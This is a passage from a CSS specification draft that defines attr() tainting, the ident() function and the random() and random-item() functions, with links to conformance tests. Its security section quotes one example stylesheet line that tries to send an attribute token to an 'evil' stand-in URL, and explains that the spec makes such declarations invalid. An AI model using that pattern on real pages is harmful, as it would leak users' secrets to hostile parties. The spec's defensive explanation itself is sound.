 and `el`. If that succeeds, return the result; otherwise,
 jump to the last step (labeled FAILURE).

7. **FAILURE:**

 1. If `second arg` is null, and `syntax` was
 omitted, return an empty CSS
 [\<string\>](https://drafts.csswg.org/css-values-4/#string-value).

 2. If `second arg` is null, return the
 [guaranteed-invalid
 value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value).

 3. [Substitute arbitrary substitution
 functions](#substitute-arbitrary-substitution-function) in `second arg`, and return the
 result.

#### 8.7.2. Security

Tests

- [attr-security-animation.html](https://wpt.fyi/results/css/css-values/attr-security-animation.html "css/css-values/attr-security-animation.html")
 [[(live
 test)]](http://wpt.live/css/css-values/attr-security-animation.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/attr-security-animation.html)
- [attr-security-if.html](https://wpt.fyi/results/css/css-values/attr-security-if.html "css/css-values/attr-security-if.html")
 [[(live
 test)]](http://wpt.live/css/css-values/attr-security-if.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/attr-security-if.html)
- [attr-security-transition.html](https://wpt.fyi/results/css/css-values/attr-security-transition.html "css/css-values/attr-security-transition.html")
 [[(live
 test)]](http://wpt.live/css/css-values/attr-security-transition.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/attr-security-transition.html)
- [attr-security.html](https://wpt.fyi/results/css/css-values/attr-security.html "css/css-values/attr-security.html")
 [[(live
 test)]](http://wpt.live/css/css-values/attr-security.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/attr-security.html)
- [attr-security-transition-interpolated.html](https://wpt.fyi/results/css/css-values/attr-security-transition-interpolated.html "css/css-values/attr-security-transition-interpolated.html")
 [[(live
 test)]](http://wpt.live/css/css-values/attr-security-transition-interpolated.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/attr-security-transition-interpolated.html)

An [attr()](#funcdef-attr) function can reference attributes that were never
intended by the page to be used for styling, and might contain sensitive
information (for example, a security token used by scripts on the page).

In general, this is fine. It is difficult to use
[attr()](#funcdef-attr)
to extract information from a page and send it to a hostile party, in
most circumstances. The exception to this is URLs. If a URL can be
constructed with the value of an arbitrary attribute, purely from CSS,
it can easily send any information stored in attributes to a hostile
party, if 3rd-party CSS is allowed at all.

To guard against this, the values produced by an
[attr()](#funcdef-attr)
are considered [attr()-tainted], as are functions that
contain an [attr()-tainted](#attr-taint) value.

The substitution value of an [arbitrary substitution
function](#arbitrary-substitution-function) is [attr()-tainted](#attr-taint) *as a whole* if any
[attr()-tainted] values were involved in creating
that substitution value. [This extends to the [equivalent token
sequence](https://drafts.css-houdini.org/css-properties-values-api-1/#equivalent-token-sequence) when substituting values of [registered custom
properties](https://drafts.css-houdini.org/css-properties-values-api-1/#registered-custom-property).]

Using an [attr()-tainted](#attr-taint) value as or in a
[\<url\>](https://drafts.csswg.org/css-values-4/#url-value) makes a declaration [invalid at
computed-value
time](#invalid-at-computed-value-time).

For example, all of the following are
[invalid at computed-value
time](#invalid-at-computed-value-time):

- [background-image:
 src(attr(foo));](https://drafts.csswg.org/css-backgrounds-3/#propdef-background-image) - can't use it directly.

- [background-image:
 image(attr(foo))](https://drafts.csswg.org/css-backgrounds-3/#propdef-background-image) - can't use it in other
 [\<url\>](https://drafts.csswg.org/css-values-4/#url-value)-taking functions.

- [background-image: src(string(\"http://example.com/evil?token=\"
 attr(foo)))](https://drafts.csswg.org/css-backgrounds-3/#propdef-background-image) - can't \"launder\" it thru another
 function.

- [\--foo: attr(foo); background-image(src(var(\--foo)))] (assuming that [\--foo] is a [registered
 custom
 property](https://drafts.css-houdini.org/css-properties-values-api-1/#registered-custom-property) with string syntax) - can't launder the value thru
 another property, either.

However, using [attr()](#funcdef-attr) for other purposes is fine, even if the usage is
*near* a url:

- [background-image: image(\"foo.jpg\", attr(bgcolor
 type(\<color\>)))](https://drafts.csswg.org/css-backgrounds-3/#propdef-background-image) is fine; the
 [attr()](#funcdef-attr) is providing a fallback color, and the
 [\<url\>](https://drafts.csswg.org/css-values-4/#url-value) isn't
 [attr()-tainted](#attr-taint).

Using [attr()](#funcdef-attr) indirectly via a [custom
property](https://drafts.csswg.org/css-variables-2/#custom-property) causes
[attr()-tainting](#attr-taint) of
the whole custom property value:

- [\--foo: image(\"foo.jpg\", attr(bgcolor type(\<color\>)));
 background-image: var(\--foo);] is [invalid
 at computed-value
 time](#invalid-at-computed-value-time).

 (#issue-36b2e6b3) Investigate partial tainting of custom
 property values.

 Implementing this restriction requires tracking a dirty
bit on values constructed from
[attr()](#funcdef-attr)
values, since they can be fully resolved into a string via [registered
custom
properties](https://drafts.css-houdini.org/css-properties-values-api-1/#registered-custom-property), so you can't rely on just examining the value
expression. Note that non-string types can even trigger this, via
functions like [string()] that can stringify other types of
values: [\--foo: attr(foo type(\<number\>)); background-image:
src(string(var(\--foo)))] needs to be invalid
as well.

### [8.8. ][ Constructing [\<custom-ident\>](https://drafts.csswg.org/css-values-4/#identifier-value) values: the [ident()](#funcdef-ident) function]
Tests

- [ident-function-computed.html](https://wpt.fyi/results/css/css-values/ident-function-computed.html "css/css-values/ident-function-computed.html")
 [[(live
 test)]](http://wpt.live/css/css-values/ident-function-computed.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/ident-function-computed.html)
- [ident-function-parsing.html](https://wpt.fyi/results/css/css-values/ident-function-parsing.html "css/css-values/ident-function-parsing.html")
 [[(live
 test)]](http://wpt.live/css/css-values/ident-function-parsing.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/ident-function-parsing.html)
- [ident-function-substitution.html](https://wpt.fyi/results/css/css-values/ident-function-substitution.html "css/css-values/ident-function-substitution.html")
 [[(live
 test)]](http://wpt.live/css/css-values/ident-function-substitution.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/ident-function-substitution.html)

The [ident()] function represents an arbitrary
[\<ident\>](https://drafts.csswg.org/css-values-4/#typedef-ident), built from one or more separate
idents, strings, and integers. It is an [arbitrary substitution
function](#arbitrary-substitution-function).

```
<ident()> = ident( <ident-arg>+ )
<ident-arg> = <string> | <integer> | <ident>
```

The [ident()](#funcdef-ident) function's [argument
grammar](#argument-grammar)
is:

```
<ident-args> = ident( <declaration-value> )
```

[ident()](#funcdef-ident) can be used anywhere that an
[identifier](https://drafts.csswg.org/css-values-4/#css-css-identifier) is expected, but it's most useful to construct
[\<custom-ident\>](https://drafts.csswg.org/css-values-4/#identifier-value) or
[\<dashed-ident\>](https://drafts.csswg.org/css-values-4/#typedef-dashed-ident) values.

In the following example, each matched
element gets a unique
[view-timeline-name](https://drafts.csswg.org/scroll-animations-1/#propdef-view-timeline-name) by combining a shared prefix with
[sibling-index()](#funcdef-sibling-index) to differentiate each element:

```
.item {
 /* vtl-1, vtl-2, vtl-3, … */
 view-timeline-name: ident("vtl-" sibling-index());
}
```

While in many cases
[attr()](#funcdef-attr)
with the [\<attr-type\>](#typedef-attr-type) set to
[\<custom-ident\>](https://drafts.csswg.org/css-values-4/#identifier-value) will do,
[ident()](#funcdef-ident) can be used to construct a
[\<custom-ident\>] using values
that come from other elements. In the following example, the
[ident()] function combines a [custom
property](https://drafts.csswg.org/css-variables-2/#custom-property) defined on a parent with an
[attr()] value coming from the element
itself:

```
.card[id] {
 /* E.g. card1, card2, card3, … */
 --id: attr(id);

 view-transition-name: ident(var(--id));
 view-transition-class: card;

 h1 {
 /* E.g. card1-title, card2-title, card3-title, … */
 view-transition-name: ident(var(--id) "-title");
 view-transition-class: card-title;
 }
}
```

To generate a
[\<dashed-ident\>](https://drafts.csswg.org/css-values-4/#typedef-dashed-ident), simply use a [\--] ident as
the first segment:

```
.element {
 anchor-name: ident(-- attr(id));
}
```

To [[replace an ident()
function](#replace-an-arbitrary-substitution-function)], given a list of `arguments`:

1. Let `arg` be the first item of `arguments`.

 [ident()](#funcdef-ident) only takes a single argument.

2. [Substitute arbitrary substitution
 functions](#substitute-arbitrary-substitution-function) in `arg`, then
 [parse](https://drafts.csswg.org/css-syntax-3/#css-parse-something-according-to-a-css-grammar) it as
 [[\<ident-arg\>](#typedef-ident-arg)+]. If that returns failure,
 return the [guaranteed-invalid
 value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value). Otherwise, let `pieces` be the result.

3. Replace each item in `pieces` with its [computed
 value](https://drafts.csswg.org/css-cascade-5/#computed-value). If any item does not, at this point, become a
 [string](https://infra.spec.whatwg.org/#string),
 [integer](https://drafts.csswg.org/css-values-4/#integer), or
 [ident](https://drafts.csswg.org/css-values-4/#css-css-identifier), return the [guaranteed-invalid
 value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value).

 For example, if the value is a function that can't
 resolve at [computed
 value](https://drafts.csswg.org/css-cascade-5/#computed-value) time.

4. Serialize each item in `pieces`, then
 [concatenate](https://infra.spec.whatwg.org/#string-concatenate) the list. Return an
 [ident](https://drafts.csswg.org/css-values-4/#css-css-identifier) whose value is the result. If the result can't be
 represented as an [ident] (for
 example, the empty string), instead return the [guaranteed-invalid
 value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value).

## 9. Generating Random Values

Tests

- [random-in-keyframe.html](https://wpt.fyi/results/css/css-values/random-in-keyframe.html "css/css-values/random-in-keyframe.html")
 [[(live
 test)]](http://wpt.live/css/css-values/random-in-keyframe.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/random-in-keyframe.html)

It is often useful to incorporate some degree of \"randomness\" to a
design, either to make repeated elements on a page feel less static and
identical, or just to add a bit of \"flair\" to a page without being
distracting.

The [random()](#funcdef-random) and
[random-item()](#funcdef-random-item) functions (the [random
functions]) allow authors to
incorporate randomness into their page, while keeping this randomness
predictable from a design perspective, letting authors decide whether a
random value should be reused in several places or be unique between
instances.

The exact random-number generation method is UA-defined. It *should* be
the case that two distinct random values have no easily-detectable
correlation, but this specification intentionally does not specify what
that means in terms of cryptographic strength. Authors *must not* rely
on [random functions](#css-random-function) for any purposes that depend on quality cryptography.

### 9.1. Generating a Random Numeric Value: the [random() function]
The [random()] function is a [math
function](https://drafts.csswg.org/css-values-4/#math-function) that represents a random value between a minimum and
maximum value, drawn from a uniform distribution, optionally limiting
the possible values to a step between those limits:

```
<random()> = random( <random-key>? , <calc-sum>, <calc-sum>, <calc-sum>? )
```

Imagine you have several [.box]
elements, all styled with the following CSS:

``` highlight
.box {
 width: random(???, 100px, 200px);
 height: random(???, 100px, 200px);
 border: thin solid;
}
```

Depending on what
[\<random-key\>](#typedef-random-key) you provide in place of the [???],
you'll get significantly different behavior for the elements:

[auto](#valdef-random-auto)/omitted, **maximum random**:

: Each property gets a different value, and it's different per element
 too, so you get a bunch of **different** random **rectangles**.

[\--foo], **shared by name**:

: Both properties use the same value, and every element shares that
 value, so you get a bunch of **identical** random **squares**.

[element-scoped](#valdef-random-element-scoped), **scoped per element**:

: Both properties use the same value, but each element gets a
 different value, so you get a bunch of **different** random
 **squares**.

[property-scoped](#valdef-random-property-scoped), **scoped per property**:

: Each property gets a different value, but each element shares that
 value, so you get a bunch of **identical** random **rectangles**.

See [§ 9.3 Evaluating Random Values](#random-evaluation) and [§ 9.4
Sharing (Or Not) Random Values: the \<random-key\>
value](#random-caching) for details on how the function is evaluated.
Its arguments are:

[\<random-key\>](#typedef-random-key)

: The optional
 [\<random-key\>](#typedef-random-key) controls which [random
 functions](#css-random-function) in the document will share a [random base
 value](#random-base-value) and which will get distinct values. If
 [\<random-key\>] is
 omitted, it behaves as
 [auto](#valdef-random-auto).

 See [§ 9.4 Sharing (Or Not) Random Values: the \<random-key\>
 value](#random-caching) for a full description of this value.

[[\<calc-sum\>](https://drafts.csswg.org/css-values-4/#typedef-calc-sum), [\<calc-sum\>]]

: The two required
 [calculations](https://drafts.csswg.org/css-values-4/#calc-calculation) specify the minimum and maximum value the function
 can resolve to. Both limits are inclusive (the result can be the min
 or the max).

 If the maximum value is less than the minimum value, it behaves as
 if it's equal to the minimum value.

 :::
 (#example-84ddc1e3) For example, [random(100px,
 300px)] will resolve to a random
 [\<length\>](https://drafts.csswg.org/css-values-4/#length-value) between [100px] and
 [300px]: it might be [100px], [300px], or any
 value between them like [234.5px].
 :::

[[\<calc-sum\>](https://drafts.csswg.org/css-values-4/#typedef-calc-sum)?]

: The final optional argument specifies a step value: the values the
 function can resolve to are further restricted to the form
 `min + (N * step)`, where N is a non-negative integer
 chosen uniformly randomly from the possible values that result in an
 in-range value.

 :::
 (#example-e07293f3) For example, [random(100px, 300px,
 50px)] can only resolve to [100px], [150px],
 [200px], [250px], or [300px]; it will never return
 a value like [120px].
 Note that the max value might not actually show up as a possible
 value; for example, in [random(100px, 200px, 30px)], the
 possible values are [100px], [130px], [160px], and
 [190px].
 :::

 Even if it's *intended* that `min` and
 `max` are exactly some integer multiple of
 `step` apart, numeric precision issues can prevent that
 from being true. To avoid these issues, if the max value is *very
 close* to equalling a stepped value (above or below it), the max
 value is used as the final stepped value instead. See [§ 9.3
 Evaluating Random Values](#random-evaluation) for precise details.

 :::
 (#example-28cc10b2) As explained in the definition of
 [round()](https://drafts.csswg.org/css-values-4/#funcdef-round), CSS has no \"natural\" precision for
 values, but the step value can be used to assign one.
 For example, [random(100px, 500px, 1px)] restricts it to
 resolving only to whole px values; [random(1, 10, 1)] is
 restricted to resolving only to integers; etc.
 :::

 Providing a step value *is not equivalent* to
 generating a random value and then rounding it; [random(100px,
 200px, 50px)] will generate three possible values (100px,
 150px, 200px) all with a 1/3 chance, while [round(random(100px,
 200px), 50px)] will generate the same three possible values,
 but [150px] will occur 1/2 the time, while [100px] and
 [200px] will only occur 1/4 of the time each.

All of the
[calculation](https://drafts.csswg.org/css-values-4/#calc-calculation) arguments can resolve to any value, but must have a
[consistent
type](https://drafts.csswg.org/css-values-4/#css-consistent-type) or else the function is invalid; the result's type will
be the consistent type.

For example, [random(50px, 100%,
1em)] is valid (assuming percentages are valid in the context this
is used, and resolve to a
[\<length\>](https://drafts.csswg.org/css-values-4/#length-value)), as all three arguments resolve to a
length.

However, [random(50px, 180deg)] is invalid, as lengths and angles
are not the same type.

#### 9.1.1. Argument Ranges

In [random(A, B)], if A is infinite, the result is infinite.

If A is finite, but the difference between A and B is either infinite or
large enough to be treated as infinite in the user agent, the result is
NaN.

In [random(A, B, C)], the same behavior for A and B as defined
above applies.

If C is infinite, the result is A.

If C is negative, zero, or positive but close enough to zero that the
range for the step multiplier (the `N` mentioned in [§ 9.3
Evaluating Random Values](#random-evaluation)) would be infinite in the
user agent, the step must be *ignored*. (The function is treated as if
only A and B were provided.)

 As usual for [math
functions](https://drafts.csswg.org/css-values-4/#math-function), if any argument calculation is NaN, the result is NaN.

### 9.2. Picking a Random Item From a List: the [random-item() function]
The [random-item()] function resolves to a random item from
among its list of items.

```
<random-item()> = random-item( <random-key> , [ <declaration-value>? ]# )
```

The [random-item()](#funcdef-random-item) function's [argument
grammar](#argument-grammar)
is:

```
<random-item-args> = random-item( <declaration-value>, [ <declaration-value>? ]# )
```

See [§ 9.3 Evaluating Random Values](#random-evaluation) and [§ 9.4
Sharing (Or Not) Random Values: the \<random-key\>
value](#random-caching) for details on how the function is evaluated.

The *required*
[\<random-key\>](#typedef-random-key) is interpreted identically to
[random()](#funcdef-random). (See [§ 9.4 Sharing (Or Not) Random Values: the
\<random-key\> value](#random-caching) for details.)

 The
[\<random-key\>](#typedef-random-key) argument is required in
[random-item()](#funcdef-random-item), but optional in
[random()](#funcdef-random), for parsing reasons (it's impossible to tell whether
[random-item(\--foo, \--bar, \--baz)] has three
[\<declaration-value\>](https://drafts.csswg.org/css-syntax-3/#typedef-declaration-value) arguments or two and a
[\<random-cache-key\>](#typedef-random-cache-key)).

The remaining arguments are arbitrary sequences of CSS values. The
[random-item()](#funcdef-random-item) function is substituted with one of these sequences,
chosen uniformly at random.

The [random-item()](#funcdef-random-item) function is an [arbitrary substitution
function](#arbitrary-substitution-function), like
[var()](https://drafts.csswg.org/css-variables-2/#funcdef-var).

That is, if you use
[random-item()](#funcdef-random-item):

- So long as
 [random-item()](#funcdef-random-item) itself (and any other [arbitrary substitution
 functions](#arbitrary-substitution-function)) is syntactically valid, the entire property is
 assumed to be valid at parse time.

- [random-item()](#funcdef-random-item) is substituted with whatever value it resolves
 to at [computed
 value](https://drafts.csswg.org/css-cascade-5/#computed-value) time when you'd [substitute a
 var()](https://www.w3.org/TR/css-variables-1/#substitute-a-var), so children all inherit the same resolved value.

- If the substituted value ends up making the property invalid, the
 property's value becomes the [guaranteed-invalid
 value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value).

To [[replace a random-item()
function](#replace-an-arbitrary-substitution-function)], given a list of `arguments`:

1. Let `value sharing` be the first
 [\<declaration-value\>](https://drafts.csswg.org/css-syntax-3/#typedef-declaration-value) in `arguments`, and
 `options` be a list of the remaining
 [\<declaration-value\>]? options.

2. [Substitute arbitrary substitution
 functions](#substitute-arbitrary-substitution-function) in `value sharing`, then
 [parse](https://drafts.csswg.org/css-syntax-3/#css-parse-something-according-to-a-css-grammar) it as
 [\<random-key\>](#typedef-random-key). If parsing returns failure,
 return the [guaranteed-invalid
 value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value); otherwise set `value sharing` to the
 result.

3. Select one of the `options`, as specified in [§ 9.3
 Evaluating Random Values](#random-evaluation), using
 `value sharing` as specified in [§ 9.4 Sharing (Or Not)
 Random Values: the \<random-key\> value](#random-caching), and let
 `chosen option` be the result.

4. [Substitute arbitrary substitution
 functions](#substitute-arbitrary-substitution-function) in `chosen option`, then return the
 result.

- [random-item-computed.html](https://wpt.fyi/results/css/css-values/random-item-computed.html "css/css-values/random-item-computed.html")
 [[(live
 test)]](http://wpt.live/css/css-values/random-item-computed.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/random-item-computed.html)
- [random-item-in-keyframe.html](https://wpt.fyi/results/css/css-values/random-item-in-keyframe.html "css/css-values/random-item-in-keyframe.html")
 [[(live
 test)]](http://wpt.live/css/css-values/random-item-in-keyframe.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/random-item-in-keyframe.html)
- [random-item-invalid.html](https://wpt.fyi/results/css/css-values/random-item-invalid.html "css/css-values/random-item-invalid.html")
 [[(live
 test)]](http://wpt.live/css/css-values/random-item-invalid.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/random-item-invalid.html)
- [random-item-nested.html](https://wpt.fyi/results/css/css-values/random-item-nested.html "css/css-values/random-item-nested.html")
 [[(live
 test)]](http://wpt.live/css/css-values/random-item-nested.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/random-item-nested.html)
- [random-item-serialize.html](https://wpt.fyi/results/css/css-values/random-item-serialize.html "css/css-values/random-item-serialize.html")
 [[(live
 test)]](http://wpt.live/css/css-values/random-item-serialize.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/random-item-serialize.html)
- [random-item-unresolvable-argument.html](https://wpt.fyi/results/css/css-values/random-item-unresolvable-argument.html "css/css-values/random-item-unresolvable-argument.html")
 [[(live
 test)]](http://wpt.live/css/css-values/random-item-unresolvable-argument.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/random-item-unresolvable-argument.html)
- [random-item-valid.html](https://wpt.fyi/results/css/css-values/random-item-valid.html "css/css-values/random-item-valid.html")
 [[(live
 test)]](http://wpt.live/css/css-values/random-item-valid.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/random-item-valid.html)
- [trig-functions-in-gradient-position.html](https://wpt.fyi/results/css/css-values/tree-counting/trig-functions-in-gradient-position.html "css/css-values/tree-counting/trig-functions-in-gradient-position.html")
 [[(live
 test)]](http://wpt.live/css/css-values/tree-counting/trig-functions-in-gradient-position.html)
 [[(source)]](https://github.com/web-platform-tests/wpt/blob/master/css/css-values/tree-counting/trig-functions-in-gradient-position.html)

### 9.3. Evaluating Random Values

Given a [random
function](#css-random-function) with a [random base
value](#random-base-value)
`R`, the value of the function is:

for a [random()](#funcdef-random) function with `min` and `max`, but no step

: Return
 `min`` + ``R`` * (``max`` - ``min``)`

for a [random()](#funcdef-random) function with `min`, `max`, and `step`

: - Let `epsilon` be
 `step`` / 1000`, or the smallest
 representable value greater than zero in the numeric type being
 used if `epsilon` would round to zero.

 - Let `N` be the largest integer such that
 `min`` + ``N`` * ``step`
 is less than or equal to `max`.

 If `N` produces a value that is not within
 `epsilon` of `max`, but `N`+1
 would produce a value within `epsilon` of
 `max`, set `N` to `N`+1.

 - Let `step index` be a [random
 integer](#generate-a-random-integer) less than `N`+1, given `R`.

 - Let `value` be
 `min`` + ``step index`` * ``step`.

 - If `step index` is `N` and
 `value` is within `epsilon` of
 `max`, return `max`.

 - Otherwise, return `value`.

 Epsilon/max Details

 `epsilon` was chosen to be
 `step`` / 1000` as a useful \"middle ground\"
 value: small enough that it's very unlikely to accidentally trigger
 when the author didn't intend it, but large enough that it's
 guaranteed to catch floating-point precision errors.

 It's size is also within the realm for authors to exploit
 themselves; if their `max` is meant to be an integer
 multiple of their `step`, but the `step` is
 not a terminating decimal, as long as they write the
 `step` with 5 or 6 digits of precision then the largest
 value should land within `epsilon` of `max`.

 For example, while [random(0px, 100px, 33.3px)] will not
 generate a [100px] value (the epsilon is [.0333px], but
 3 steps yields [99.9px], which is [.1px] from
 `max`, more than the epsilon), [random(0px, 100px,
 33.333px)] will (the epsilon is [.033333px], similar to
 the previous example, but 3 steps yields [99.999px], which is
 [.001px] from `max`, much less than the epsilon).
 (A sufficiently large number of steps could still cause enough
 divergence to defeat this, but it works for any remotely reasonable
 use-case.)

 Using a
 [calculation](https://drafts.csswg.org/css-values-4/#calc-calculation) to \"exactly\" represent non-terminating decimals
 will also work, of course: [random(0px, 100px, 100px / 3)] is
 guaranteed to be able to generate a [100px] value, as the step
 value will only be subject to floating-point precision errors far
 smaller than the epsilon.

for a [random-item()](#funcdef-random-item) function with `N` [\<declaration-value\>](https://drafts.csswg.org/css-syntax-3/#typedef-declaration-value)? arguments:

: - Let `index` be a [random
 integer](#generate-a-random-integer) less than `N`, given `R`.

 - Return the `index`'th argument (0-indexed).

To [generate a random integer] less
than some integer `limit` given a [random base
value](#random-base-value)
`R`, return [round(down, `R` \*
`limit`, 1)]

### 9.4. Sharing (Or Not) Random Values: the [\<random-key\> value]
CSS is a declarative language, so functions don't have a specific "time"
when they're evaluated; the user agent is free to "execute" functions in
any order, as many times as they want, as every execution will return
the same value. This is difficult to square with random-value functions,
which are inherently *stateful* and care about when, how often, and in
what order they're executed.

To solve this, the [random
functions](#css-random-function) are associated with a [random cache
name](#random-cache-name),
ensuring that any time the random function is evaluated with the same
cache key, it will return the same [random base
value](#random-base-value);
and also that [random functions] with
*different* caching keys will return *different* [random base
value] from each other (unless they are,
randomly, the same).

The [\<random-key\>](#typedef-random-key) value controls this behavior, and
defaults to [auto](#valdef-random-auto) when omitted. It's syntax is as follows, and
interpreted as described below:

```
<random-key> = auto | <random-cache-key> | fixed <number [0,1]>
<random-cache-key> = <dashed-ident> || element-scoped
 || [ property-scoped | property-index-scoped | <random-ua-ident> ]
<random-ua-ident> = <custom-ident>
```

[auto]

: The [random
 function](#css-random-function) is roughly "as random as possible": the [random
 cache name](#random-cache-name), and thus the result, varies across every
 [random()](#funcdef-random) instance in a multi-component value, across
 different properties, and across different elements.

 This is equivalent to specifying [element-scoped
 property-index-scoped], and simplifies in exactly the same
 way.

[[\<random-cache-key\>](#typedef-random-cache-key)]

: The
 [\<random-cache-key\>](#typedef-random-cache-key) specifies the [random cache
 name](#random-cache-name), allowing it to be explicitly shared (or not) with
 other uses of [random
 functions](#css-random-function). Every [random
 function] using the same [random
 cache name] will get the same random
 value; every one using a *different* [random cache
 name] will get unrelated random values.

 - The
 [\<dashed-ident\>](https://drafts.csswg.org/css-values-4/#typedef-dashed-ident) gives the value an explicit
 name. If omitted, this part of the name is null.

 - [element-scoped] adds an element-specific identifier to
 the [random cache
 name](#random-cache-name), so different elements will get different random
 values.

 If the [random
 function](#css-random-function) is being evaluated inside of a [custom
 function](https://drafts.csswg.org/css-mixins-1/#custom-function), the element-specific identifier is for the
 \"hypothetical element\" that the function's styles are evaluated
 on, so
 [element-scoped](#valdef-random-element-scoped) will give you different random values on
 every function invocation.

 - [property-scoped] adds the property name the [random
 function](#css-random-function) is being used on to the [random cache
 name](#random-cache-name), so different properties will get different
 random values. Note that shorthand declarations will apply the
 [shorthand
 property](https://drafts.csswg.org/css-cascade-5/#shorthand-property)'s name.

 - [property-index-scoped] adds the property name *and* the index
 of the random function among all the random functions used in the
 same property value to the [random cache
 name](#random-cache-name), so multiple instances of a [random
 function](#css-random-function) in the same declaration will each get different
 [random cache names]. Note this index
 is assigned *before*
 [shorthand](https://drafts.csswg.org/css-cascade-5/#shorthand-property) expansion.

 See [§ 9.4.1 Simplification of \<random-key\>](#random-simplify) for
 how these values resolve.

 The
 [[\<random-ua-ident\>](#typedef-random-ua-ident)] value, like
 [fixed](#valdef-random-fixed) below, isn't intended to be specified by authors,
 but can show up in [computed
 values](https://drafts.csswg.org/css-cascade-5/#computed-value). It is a
 [\<custom-ident\>](https://drafts.csswg.org/css-values-4/#identifier-value) that must start with the prefix
 [ua-], or else it is invalid. When generated automatically by
 the user agent, it follows certain specific patterns; see [§ 9.4.1
 Simplification of \<random-key\>](#random-simplify) for details.

[fixed [\<number \[0,1\]\>](https://drafts.csswg.org/css-values-4/#number-value)]

: If [fixed
 [\<number\>](https://drafts.csswg.org/css-values-4/#number-value)] is specified, the [random
 function](#css-random-function) bypasses the [random cache
 name](#random-cache-name) entirely, and just uses the
 [\<number\>](https://drafts.csswg.org/css-values-4/#number-value) as its [random base
 value](#random-base-value) directly.

 While [1] is technically allowed as a valid value (because CSS
 grammars can only express closed ranges), the [random base
 value](#random-base-value) is clamped to the highest representable value less
 than [1], so [random base values]
 remain in the half-open range \`\[0, 1)\`.

 While this value *might* be useful for authors to
 get predictable values while testing a page, the reason it exists is
 to fix some corner cases in
 [inheritance](https://drafts.csswg.org/css-cascade-5/#css-inheritance) that would otherwise cause elements to *not* share
 [random base values](#random-base-value) when authors would expect them to. It is observable
 in some rare [computed
 values](https://drafts.csswg.org/css-cascade-5/#computed-value), but otherwise will never show up in an element's
 styles.

Note that only the [random cache
name](#random-cache-name)
controls whether two [random
functions](#css-random-function) have the same value or not; their *other* arguments
don't contribute in any way.

Thus, the following two styles:

``` highlight
.foo {
 width: random(--foo, 100px, 200px);
 animation: --pulse linear random(--foo, 1s, 2s);
}
```

will actually share a [random base
value](#random-base-value)
because their [random cache
names](#random-cache-name)
are identical. If this [random cache name]
is linked to a [random base value] of
0.25, for example, this will give the element a width of [125px]
and an animation-duration of [1.25s].

If you want the values to be completely uncorrelated, give them distinct
names ([\--foo] vs [\--bar]) or mix in additional
information that will uniquify their [random cache
names](#random-cache-name)
(specifying [\--foo property-scoped], or omitting the
[\<random-key\>](#typedef-random-key) argument entirely)

Details about how
[auto](#valdef-random-auto) works

The [auto](#valdef-random-auto) value is identical to specifying [\--foo
element-scoped property-index-scoped], just with an unobservable
name that you can't manually match with a
[\<dashed-ident\>](https://drafts.csswg.org/css-values-4/#typedef-dashed-ident).

*Usually*, this ensures that every instance of a [random
function](#css-random-function), on every element, gets a different [random cache
name](#random-cache-name)
and thus a different [random base
value](#random-base-value). However, this can fail in some corner cases, causing
random values to be shared when it's unexpected. For example, in the
following:

``` highlight
.foo {
 animation: flicker linear random(1s, 2s);
}
.foo:hover {
 animation: glow linear random(4s, 6s);
}
```

The two [random()](#funcdef-random) functions have the same [random cache
name](#random-cache-name)
on a given element (both are the first [random
function](#css-random-function) used in
[animation](https://drafts.csswg.org/css-animations-1/#propdef-animation)), so they'll share [random base
values](#random-base-value) on a single element and generate related random values,
even though the author likely considers them to be different instances
of [random()].

This unexpected sharing is, unfortunately, unavoidable. CSS generally
doesn't care *how* you organize styles for your elements; in particular,
whether you style several elements with a single style rule like [.foo,
.bar {\...}], multiple style rules like [.foo {\...} .bar
{\...}], or by setting the
[`style`](https://html.spec.whatwg.org/multipage/dom.html#attr-style) attribute on each element individually, you'll
get the same results. This needs to continue to be true even when you're
using random values, so we can't distinguish random values by how
they're *set*, only how they're *used*.

There's no syntactic distinction in a stylesheet between styling
\"related\" elements and \"independent\" elements, or distinguishing
\"independent\" states, so we must treat all elements as potentially
related for this purpose. If this is undesirable, you can always supply
a sufficiently unique
[\<dashed-ident\>](https://drafts.csswg.org/css-values-4/#typedef-dashed-ident) yourself, like
[random(\--sidebar-width, \...)] on one set of elements and
[random(\--card-width, \...)] on another, or [random(\--flicker,
\...)] and [random(\--glow, \...)] on the different rules.

More specifically, the
[random()](#funcdef-random) and
[random-item()](#funcdef-random-item) functions are defined to generate random values
under the following caching semantics:

- Each instance of a [random
 function](#css-random-function) in styles has an associated [random base
 value].

 If the [random
 function's](#css-random-function)
 [\<random-key\>](#typedef-random-key) is [fixed
 [\<number\>](https://drafts.csswg.org/css-values-4/#number-value)], the [random base
 value](#random-base-value) is that number.

 Otherwise, the [random base
 value](#random-base-value) is a pseudo-random real number in the range \`\[0,
 1)\` (greater than or equal to 0 and less than 1), generated from a
 uniform distribution, and influenced by the function's [random cache
 name](#random-cache-name).

- Each [random
 function](#css-random-function) also specifies a [random cache
 name]. Two [random functions]
 with the same [random cache
 name](#random-cache-name) must also have the same [random base
 value](#random-base-value); two functions with different [random cache
 names] must have distinct [random base
 values]. (That is, generated by a fresh
 random operation; randomness might of course produce the same actual
 value.)

 It is intentionally unspecified *how* the [random cache
